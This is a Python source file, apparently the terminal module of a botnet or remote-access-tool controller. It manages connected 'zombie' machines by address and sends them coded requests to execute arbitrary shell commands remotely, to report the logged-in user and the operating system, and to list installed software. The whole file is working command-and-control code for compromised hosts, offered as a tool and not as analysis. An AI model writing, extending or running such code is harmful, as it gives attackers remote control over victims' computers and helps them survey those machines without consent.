#!/usr/bin/env python3

'''
This script is for managing terminal requests
'''

import re
from tkinter import *
from modules.get_modules import push_text_in_terminal_module

codes_list = {
    'exec':'1',
    '1':'exec',
    '__comment__get_os':'cid=2, does not have second part (for request)',
    'get_os':'2',
    '2':'get_os',
    '__comment__get_software':'cid=3, does not have second part (for request)',
    'get_software':'3',
    '3':'get_software',
    '__comment__get_whoami':'cid=4, does not have second part (for request)',
    '4':'get_whoami',
    'get_whoami':'4'
}

class Terminal:
    def __init__(self, command, zombies_addresses_and_communicators_list, default_target ,is_from_gui, terminal_window_box=None):
        self.terminal_window_box = terminal_window_box
        self.command = command.strip()
        # storing clients sockets and their ips [ip:port,communicator]
        self.zombies_addresses_and_communicators_list = zombies_addresses_and_communicators_list
        self.default_target = default_target
        self.is_from_gui = is_from_gui

    def interpret_command(self):
        # self.command = ''
        if self.command.startswith('!clear'):
            self.clear_terminal()

        elif self.command.startswith('!help'):
            help_msg = '''
!help                   ---> show help
!clear                  ---> clear terminal
!exec "COMMAND"         ---> execute command
Example: !exec "ls" -h "192.168.1.100:49700"
Select Target           ---> -h "TARGET"
!set target TARGET      ---> set default target
!get-zombies            ---> get connected zombies
!software               ---> get target installed software
!whoami                 ---> get logged in user
            '''
            self.push_text_in_terminal_box(text=help_msg)

        elif self.command.startswith('!exec'):
            self.exec_command()
        elif self.command.startswith('!get-zombies'):
            for ac in self.zombies_addresses_and_communicators_list:
                self.push_text_in_terminal_box(text=ac[0])
        elif self.command.startswith('!get-os'):
            self.get_os()
        elif self.command.startswith('!software'):
            self.get_software()
        elif self.command.startswith('!whoami'):
            self.get_whomai()
        else:
            first_command = self.command.split(' ')
            if len(first_command) >= 1 :
                first_command = first_command[0]
            elif len(first_command) == 0:
                first_command = self.command
            self.push_text_in_terminal_box(text='Command {} Not Found!'.format(first_command))

    def get_whomai(self):
        target_list = self.find_target_zombie()
        if target_list:
            for target in target_list:
                self.push_text_in_terminal_box(text='Target : {}'.format(target))
                communicator = self.get_communicator(target=target)
                msg = 'cid={},'.format(codes_list['get_whoami'])
                reply = communicator.msg_manager(msg=msg, has_reply=True)
                get_cid_pattern = r'cid=(\d*),'
                cid = re.findall(get_cid_pattern, reply)
                if len(cid) == 1:
                    cid = cid[0]
                    if codes_list[cid] == 'get_whoami':
                        output = reply.split(',')
                        if len(output) >= 2:
                            output = ",".join(output[1:])
                            self.push_text_in_terminal_box(text=output)

    def get_software(self):
        target_list = self.find_target_zombie()
        if target_list:
            for target in target_list:
                self.push_text_in_terminal_box(text='Target : {}'.format(target))
                communicator = self.get_communicator(target=target)
                msg = 'cid={},'.format(codes_list['get_software'])
                reply = communicator.msg_manager(msg=msg, has_reply=True)

                get_cid_pattern = r'cid=(\d*),'
                cid = re.findall(get_cid_pattern, reply)
                if len(cid) == 1:
                    cid = cid[0]
                    if codes_list[cid] == 'get_software':
                        output = reply.split(',')
                        if len(output) >= 2:
                            output = ",".join(output[1:])
                            self.push_text_in_terminal_box(text=output)

    def get_os(self):
        target_list = self.find_target_zombie()
        if target_list:
            for target in target_list:
                self.push_text_in_terminal_box(text='Target : {}'.format(target))
                communicator = self.get_communicator(target=target)
                os_info = communicator.get_os()
                self.push_text_in_terminal_box(text='Target {} --> {}'.format(target,os_info))

    def clear_terminal(self):
        if not self.is_from_gui:
            return
        self.terminal_window_box.config(state='normal')
        self.terminal_window_box.delete('1.0', END)
        self.terminal_window_box.config(state='disabled')

    def exec_command(self):
        get_command_pattern = r'!exec\s*"(.*?)"'
        command_extracted = re.findall(get_command_pattern, self.command)
        if len(command_extracted) == 1:
            command_extracted = command_extracted[0]
            target_list = self.find_target_zombie()
            if target_list:
                for target in target_list:
                    self.push_text_in_terminal_box(text='Target : {}'.format(target))
                    communicator = self.get_communicator(target=target)
                    reply = communicator.msg_manager(msg='cid=' + codes_list['exec'] + ',{}'.format(command_extracted),
                                                     has_reply=True)
                    get_cid_pattern = r'cid=(\d*),'
                    try:
                        cid = re.findall(get_cid_pattern, reply)
                    except TypeError:
                        return
                    if len(cid) == 1:
                        cid = cid[0]
                        if codes_list[cid] == 'exec':
                            output = reply.split(',')
                            if len(output) >= 2:
                                output = ",".join(output[1:])
                                self.push_text_in_terminal_box(text=output)
        else:
            self.push_text_in_terminal_box(text='Command Not Found --> example: !exec "ls" -h "192.168.1.1:49520"')

    def find_target_zombie(self):
        # !exec "ls" -h "192.168.10.25:52000"
        get_host_pattern = r' -h "(.*?)"'
        host_from_command = re.findall(get_host_pattern, self.command)
        if len(host_from_command) > 0:
            return host_from_command
        else:
            if self.default_target:
                return [self.default_target]
            else:
                self.push_text_in_terminal_box('select target --> -h TARGET')
                return None

    def get_communicator(self ,target):

        for ac in self.zombies_addresses_and_communicators_list:
            if target in ac:
                return ac[1]

        self.push_text_in_terminal_box(text='Target {} Not Found!'.format(target))

    def push_text_in_terminal_box(self, text):
        push_text_in_terminal_module(is_from_gui=self.is_from_gui, terminal_window_box=self.terminal_window_box,
                                     text=text)
